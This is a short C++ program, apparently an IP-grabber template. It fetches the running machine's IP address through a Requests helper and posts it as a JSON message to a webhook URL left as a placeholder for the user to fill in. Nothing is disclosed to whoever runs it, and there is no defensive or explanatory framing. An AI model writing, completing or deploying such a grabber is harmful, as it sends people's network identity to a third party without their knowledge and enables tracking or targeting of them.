#include <iostream>
#include "Requests.hpp"

int main(int argc, char* argv[]) {
	std::string ip = Requests::getIP();
	std::string message = "{\"content\": \"**IP: **" + ip + "\"}";

	const char* webhook_url = "Your webhook URL";

	Requests::sendRequest(webhook_url, message.c_str());

	return EXIT_SUCCESS;
}